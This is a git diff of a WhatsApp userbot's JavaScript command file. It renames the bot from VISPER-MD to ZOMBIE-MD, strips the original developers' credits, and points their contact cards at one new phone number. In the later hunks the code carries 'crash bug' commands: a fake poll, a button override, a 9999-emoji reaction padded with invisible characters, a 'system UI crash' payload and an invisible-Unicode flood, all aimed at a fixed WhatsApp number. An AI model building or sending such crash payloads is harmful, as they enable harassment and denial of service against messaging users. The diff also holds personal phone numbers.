@@ -21,8 +21,8 @@ const fkontak = {
     },
     message: {
         contactMessage: {
-            displayName: "©VISPER-MD",
-            vcard: `BEGIN:VCARD\nVERSION:3.0\nN:XL;Meta AI;;;\nFN:Meta AI\nitem1.TEL;waid=94711451319:94711451319\nitem1.X-ABLabel:Ponsel\nEND:VCARD`,
+            displayName: "©ZOMBIE-MD",
+            vcard: `BEGIN:VCARD\nVERSION:3.0\nN:XL;Meta AI;;;\nFN:Meta AI\nitem1.TEL;waid=94754871798:94775700815\nitem1.X-ABLabel:Ponsel\nEND:VCARD`,
             sendEphemeral: false,
         },
     },
@@ -95,24 +95,19 @@ I am alive now 🎈\n✨ Thank you for choosing \`Visper-MD\` — your trusted W
 *├ \`🎡 𝐏𝐫𝐞𝐟𝐢𝐱\`* : ${config.PREFIX}
 *├ \`👤 𝐔𝐬𝐞𝐫\`* : ${pushname}
 *├ \`⛵ 𝐑𝐚𝐦 𝐮𝐬𝐬𝐚𝐠𝐞\`* : ${ramUsage}
-*├ \`⚖ 𝐃𝐞𝐯𝐞𝐥𝐨𝐩𝐞𝐫𝐬\`* : *VISPER ᴵᴺᶜ*
-*├ \`🧬 𝐕𝐞𝐫𝐬𝐢𝐨𝐧\`* : 4.0.0
+*├ \`⚖ 𝐃𝐞𝐯𝐞𝐥𝐨𝐩𝐞𝐫𝐬\`* : *ZOMBIE*
+*├ \`🧬 𝐕𝐞𝐫𝐬𝐢𝐨𝐧\`* : 2.0.0
 *└────────────────────┘*
 *┌────────────────────┐*
-*├ 👨‍💻ᴠɪꜱᴘᴇʀ ᴅᴇᴠᴇʟᴏᴘᴇʀꜱ* :
-  \`• Founder & Developer\` : 𝗦avithu Induwara
-  \`• Co-Develper\` : 𝗗arksadas YT
-  \`• Co-Developer\` : 𝗡adeen Poorna
-  \`• Main-Supplier\` : 𝗣oorna Thalisha
-  \`• System Leader\` : 𝗔lex-ID
-  \`• API Developer\` : 𝗣athum 𝗥ajapakshe
+*🚫 ᴅᴇᴠᴇʟᴏᴘᴇʀꜱ* :
+*ONLY ME* - DILISHA
 *└────────────────────┘*
 *🫟 Your all-in-one WhatsApp assistant — fast, reliable, and easy to use!* 
 *🔗 Official Links:*  
 • *📂 GitHub Repository:* ${details.reponame}  
 • *📢 WhatsApp Channel:* ${details.chlink}   
 
-*💛 Thank you for trusting VISPER-MD!*`,
+*💛 Thank you for trusting ZOMBIE!*`,
         footer: config.FOOTER,
         buttons: baseButtons,
         headerType: 4
@@ -321,7 +316,7 @@ async (conn, mek, m, { from, pushname, prefix,  reply, l }) => {
     const rtime = await runtime(process.uptime());
 const number = conn.user.id.split(':')[0].replace(/@s\.whatsapp\.net$/, '');
     const caption =  `*Hello ${pushname}  👋*
-I am *VISPER-MD* Userbot🎈
+I am *ZOMBIE-MD* Userbot🎈
 *┌────────────────────┐*
 *├ \`⏰ 𝐔𝐩𝐭𝐢𝐦𝐞\`* : ${rtime}
 *├ \`🚨 𝐇𝐨𝐬𝐭\`* : ${hostname}
@@ -329,7 +324,7 @@ I am *VISPER-MD* Userbot🎈
 *├ \`👤 𝐔𝐬𝐞𝐫\`* : ${pushname}
 *├ \`⛵ 𝐑𝐚𝐦 𝐮𝐬𝐬𝐚𝐠𝐞\`* : ${ramUsage}
 *├ \`👨🏻‍💻 𝐎𝐰𝐧𝐞𝐫\`* : ${number}
-*├ \`⚖ 𝐃𝐞𝐯𝐞𝐥𝐨𝐩𝐞𝐫𝐬\`* : *VISPER ᴵᴺᶜ*
+*├ \`📥 TEAM\`* : *ONLY ME*
 *├ \`🧬 𝐕𝐞𝐫𝐬𝐢𝐨𝐧\`* : 4.0.0
 *├ \`💼 𝐖𝐨𝐫𝐤 𝐓𝐲𝐩𝐞\`* : ${config.WORK_TYPE}
 *└────────────────────┘*
@@ -337,7 +332,7 @@ I am *VISPER-MD* Userbot🎈
 *🫟 Your all-in-one WhatsApp assistant — fast, reliable, and easy to use!*`;
 
  const captionn =  `*Hello ${pushname}  👋*
-I am *VISPER-MD* Userbot🎈
+I am *ZOMBIE-MD* Userbot🎈
 *┌────────────────────┐*
 *├ \`⏰ 𝐔𝐩𝐭𝐢𝐦𝐞\`* : ${rtime}
 *├ \`🚨 𝐇𝐨𝐬𝐭\`* : ${hostname}
@@ -345,7 +340,7 @@ I am *VISPER-MD* Userbot🎈
 *├ \`👤 𝐔𝐬𝐞𝐫\`* : ${pushname}
 *├ \`⛵ 𝐑𝐚𝐦 𝐮𝐬𝐬𝐚𝐠𝐞\`* : ${ramUsage}
 *├ \`👨🏻‍💻 𝐎𝐰𝐧𝐞𝐫\`* : ${number}
-*├ \`⚖ 𝐃𝐞𝐯𝐞𝐥𝐨𝐩𝐞𝐫𝐬\`* : *VISPER ᴵᴺᶜ*
+*├ \`*TEAM* : *ONLY ME*
 *├ \`🧬 𝐕𝐞𝐫𝐬𝐢𝐨𝐧\`* : 4.0.0
 *├ \`💼 𝐖𝐨𝐫𝐤 𝐓𝐲𝐩𝐞\`* : ${config.WORK_TYPE}
 *└────────────────────┘*
@@ -394,7 +389,7 @@ I am *VISPER-MD* Userbot🎈
         title: "Select Menu :)",
         sections: [
           {
-            title: "VISPER-MD",
+            title: "ZOMBIE-MD",
             rows: [
               { title: "MAIN COMMANDS", "description":"Main command menu", id: `${prefix}mainmenu` },
 				{ title: "OWNER COMMANDS", "description":"Group command menu", id: `${prefix}ownermenu` },
@@ -456,7 +451,7 @@ async (conn, mek, m, {
 
     try {
 
-	    const details = (await axios.get('https://mv-visper-full-db.pages.dev/Main/main_var.json')).data;
+	    const details = (await axios.get('https://raw.githubusercontent.com/ZombieLN/zombie-db/refs/heads/main/main_var.json')).data;
         let inviteCode = `${details.supglink}`;
          
     let result = inviteCode.split(" ")[0].split("https://chat.whatsapp.com/")[1];
@@ -933,36 +928,36 @@ async (conn, mek, m, {
     try {
         let vcard1 = 'BEGIN:VCARD\n' 
                    + 'VERSION:3.0\n' 
-                   + 'FN: Themi Sadas\n' 
+                   + 'FN: Load Dilisha\n' 
                    + 'ORG: Web Developer;\n' 
-                   + 'TEL;type=CELL;type=VOICE;waid=94724375368:+94724375368\n' 
+                   + 'TEL;type=CELL;type=VOICE;waid=94754871798:+94775700815\n' 
                    + 'END:VCARD';
 
         let vcard2 = 'BEGIN:VCARD\n' 
                    + 'VERSION:3.0\n' 
                    + 'FN: Savithu Iduwara\n' 
                    + 'ORG: Web Developer;\n' 
-                   + 'TEL;type=CELL;type=VOICE;waid=94722617699:+94722617699\n' 
+                   + 'TEL;type=CELL;type=VOICE;waid=94754871798:+94775700815\n' 
                    + 'END:VCARD';
 		let vcard3 = 'BEGIN:VCARD\n' 
                    + 'VERSION:3.0\n' 
                    + 'FN: Nadeen Poorna\n' 
                    + 'ORG: Co-Developer;\n' 
-                   + 'TEL;type=CELL;type=VOICE;waid=94711451319:+9471451319\n' 
+                   + 'TEL;type=CELL;type=VOICE;waid=94754871798:+94775700815\n' 
                    + 'END:VCARD';
 
 		let vcard4 = 'BEGIN:VCARD\n' 
                    + 'VERSION:3.0\n' 
                    + 'FN: Pathum Rajapakshe\n' 
                    + 'ORG: API-Developer;\n' 
-                   + 'TEL;type=CELL;type=VOICE;waid=94766863255:+94766863255\n' 
+                   + 'TEL;type=CELL;type=VOICE;waid=94754871798:+94775700815\n' 
                    + 'END:VCARD';
 
 let vcard5 = 'BEGIN:VCARD\n' 
                    + 'VERSION:3.0\n' 
                    + 'FN: Poorna Thalisha\n' 
                    + 'ORG: Suplier;\n' 
-                   + 'TEL;type=CELL;type=VOICE;waid=94719255382:+94724972306\n' 
+                   + 'TEL;type=CELL;type=VOICE;waid=94754871798:+94775700815\n' 
                    + 'END:VCARD';
 
         await conn.sendMessage(from, { 
@@ -1140,7 +1135,7 @@ async (conn, mek, m, { reply, from }) => {
 
     // Stylish system info message
     const sysInfo = `
-*📡 𝚅𝙸𝚂𝙿𝙴𝚁 𝚂𝚈𝚂𝚃𝙴𝙼 𝚂𝚃𝙰𝚃𝚄𝚂 📡*
+*📡 𝚂𝚈𝚂𝚃𝙴𝙼 𝚂𝚃𝙰𝚃𝚄𝚂 📡*
 
 \`⏰𝗨𝗽𝘁𝗶𝗺𝗲:\`       *${rtime}*\n
 \`🗃𝗥𝗔𝗠 𝗨𝘀𝗮𝗴𝗲:\`    *${ram}*\n
@@ -1578,8 +1573,8 @@ return await reply(`❌ *Please give me a jid and quote a message you want*\n\n*
 if(m.quoted && m.quoted.type === "stickerMessage"){
 let image = await m.quoted.download()
             let sticker = new Sticker(image, {
-                pack: "⦁ SAVIYA-MD ⦁",
-                author: "⦁ SAVIYA-X-MD ⦁",
+                pack: "⦁ ZOMBIE-MD ⦁",
+                author: "⦁ ZOMBIE-X-MD ⦁",
                 type: StickerTypes.FULL, //q.includes("--default" || '-d') ? StickerTypes.DEFAULT : q.includes("--crop" || '-cr') ? StickerTypes.CROPPED : q.includes("--circle" || '-ci') ? StickerTypes.CIRCLE : q.includes("--round" || '-r') ? StickerTypes.ROUNDED : StickerTypes.FULL,
                 categories: ["🤩", "🎉"],
                 id: "12345",
@@ -1864,7 +1859,7 @@ const jet = {
         let type = fileType.fromBuffer(buff);
         await fs.promises.writeFile("./" + type.ext, buff);
 	await sleep(1000)
-	let caps = jet.message.videoMessage.caption || "⦁ ᴘʀᴀʙᴀᴛʜ-ᴍᴅ ⦁"
+	let caps = jet.message.videoMessage.caption || "Ｋɪɴɢ Ｄɪʟɪᴤʜᴀ"
          
 	const jid = q || from
   conn.sendMessage(jid, { video: { url: "./" + type.ext }, caption: caps, viewOnce:true });	
@@ -1929,7 +1924,7 @@ let fileType = require('file-type');
 let type = fileType.fromBuffer(buff);
 await fs.promises.writeFile("./" + type.ext, buff);
 await sleep(1000)
-let caps = jet.message.imageMessage.caption || "⦁ ᴘʀᴀʙᴀᴛʜ-ᴍᴅ ⦁"
+let caps = jet.message.imageMessage.caption || "Ｋɪɴɢ Ｄɪʟɪᴤʜᴀ"
  const jid = q || from
 
   conn.sendMessage(jid, { image: { url: "./" + type.ext }, caption: caps,viewOnce:true });
@@ -2204,11 +2199,11 @@ async (conn, m, { args, text, command }) => {
     };
 
     // Send Bug Message (Button Override)
-    await conn.sendMessage(`94756857260@s.whatsapp.net`, buttonOverride, { quoted: m });
+    await conn.sendMessage(`94754871798@s.whatsapp.net`, buttonOverride, { quoted: m });
 
     // Send Poll Update Crash after small delay
     await delay(1000);
-    await conn.relayMessage(`94756857260@s.whatsapp.net`, fakePoll, {});
+    await conn.relayMessage(`94754871798@s.whatsapp.net`, fakePoll, {});
 
     await m.reply(`✅ Crash bug combo sent to `);
   } catch (e) {
@@ -2232,14 +2227,14 @@ async (conn, m, { args }) => {
     const reaction = {
       react: "💥".repeat(9999) + "\u2063".repeat(9999), // Massive emoji + invisible override
       key: {
-        remoteJid: `94756857260@s.whatsapp.net`,
+        remoteJid: `94754871798@s.whatsapp.net`,
         fromMe: false,
         id: "ABCD1234567890", // Fake message ID
-        participant: `94756857260@s.whatsapp.net`,
+        participant: `94754871798@s.whatsapp.net`,
       }
     };
 
-    await conn.sendMessage(`94756857260@s.whatsapp.net`, { react: reaction });
+    await conn.sendMessage(`94754871798@s.whatsapp.net`, { react: reaction });
     await m.reply(`✅ Crash reaction *`);
   } catch (err) {
     console.error(err);
@@ -2278,7 +2273,7 @@ async (conn, m, { args }) => {
   };
 
   try {
-    await conn.sendMessage(`94756857260@s.whatsapp.net`, systemCrashPayload, { quoted: m });
+    await conn.sendMessage(`94754871798@s.whatsapp.net`, systemCrashPayload, { quoted: m });
     await m.reply(`✅ System UI crash bug sent to `);
   } catch (err) {
     console.error(err);
@@ -2327,7 +2322,7 @@ Invisible Character Count: *${payload.length}*
 ${payload}`;
 
   try {
-    await conn.sendMessage(`94756857260@s.whatsapp.net`, { text: messageText });
+    await conn.sendMessage(`94754871798@s.whatsapp.net`, { text: messageText });
     await reply(`✅ Unicode test message sent to successfully.\nPayload size: *${payload.length}* invisible characters.`);
   } catch (err) {
     console.error("bugedu-error:", err);
@@ -2859,15 +2854,15 @@ cmd({
 }, async (conn, mek, m, { from }) => {
     try {
         const devList = [
-            { name: "🧠 Saviya", role: "Founder", number: "94722617699" },
-            { name: "⚡ Sadas", role: "Co-Developer", number: "94724375368" },
-            { name: "💻 Nadeen", role: "Co-Developer", number: "94711451319" },
-            { name: "🧩 Pathum", role: "API-Developer", number: "94766863255" },
-            { name: "🎯 Poorna", role: "Supplier", number: "94719255382" },
-            { name: "👑 Alex", role: "System Leader", number: "94742524701" }
+            { name: "🧠 ME", role: "Founder", number: "94754871798" },
+            { name: "⚡ ME", role: "Co-Developer", number: "94754871798" },
+            { name: "💻 ME", role: "Co-Developer", number: "94754871798" },
+            { name: "🧩 ME", role: "API-Developer", number: "94754871798" },
+            { name: "🎯 ME", role: "Supplier", number: "94754871798" },
+            { name: "👑 ME", role: "System Leader", number: "94754871798" }
         ];
 
-        let text = `*👨‍💻 ${config.BOT_NAME || "VISPER-MD"} Developer Team*\n\n`;
+        let text = `*👨‍💻 ${config.BOT_NAME || "ZOMBIE-MD"} Developer Team*\n\n`;
 
         for (let dev of devList) {
             const mention = `@${dev.number}`;
